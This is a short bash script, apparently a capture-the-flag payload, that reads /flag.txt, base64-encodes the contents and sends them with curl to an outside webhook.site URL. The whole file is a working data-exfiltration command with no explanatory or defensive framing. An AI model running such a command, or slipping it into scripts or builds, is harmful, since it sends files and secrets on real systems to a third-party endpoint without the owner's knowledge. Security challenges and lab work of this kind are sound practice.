#!/bin/bash

OUTPUT=`cat /flag.txt | base64`
curl https://webhook.site/e79693b0-3e9a-43ff-a11c-72901e4c04a1/$OUTPUT
